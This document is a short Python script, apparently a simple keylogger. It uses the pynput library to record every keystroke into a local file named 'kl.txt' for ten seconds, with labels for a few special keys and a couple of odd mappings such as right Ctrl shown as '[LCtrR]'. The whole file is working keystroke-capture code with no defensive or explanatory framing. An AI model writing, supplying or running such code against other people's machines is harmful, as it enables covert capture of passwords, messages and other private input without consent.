from pynput.keyboard import Listener
from datetime import datetime, timedelta

special_keys = {"Key.space": "[Space]", "Key.enter": "[Enter]", "<98>": "2", "Key.tab": "[Tab]",
                "Key.ctrl_l": "[LCtrl]", "Key.ctrl_r": "[LCtrR]"}


def on_press(key):
    listen = str(key).replace("'", "")
    if special_keys.get(listen):
        listen = special_keys[listen]
    with open("kl.txt", "a") as f:
        f.write(listen)


start = datetime.now()
end = start + timedelta(seconds=10)


def on_release(key):
    if datetime.now() >= end:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
